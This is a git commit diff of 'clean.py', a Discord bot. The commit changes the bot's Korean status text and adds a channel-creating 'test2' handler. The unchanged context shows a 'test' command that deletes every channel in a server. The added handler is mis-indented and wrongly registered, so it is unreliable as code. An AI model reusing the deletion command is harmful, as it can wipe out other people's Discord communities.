0f6075652201b22c350a86c1ce1b90d67de8bdf2
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-21 03:39:45 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -12,7 +12,7 @@ async def on_ready():
   # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
   await client.change_presence(status=discord.Status.online)
 
-  await client.change_presence(activity=discord.Game(name="이하율 아이 "))
+  await client.change_presence(activity=discord.Game(name="호우"))
   #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
@@ -24,6 +24,11 @@ async def test(ctx):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
-
+        
+@client.event
+async def test2(ctx):
+    guild = ctx.guild
+      await guild.create_text_channel('yess')
+      
 
 client.run(os.environ['token'])
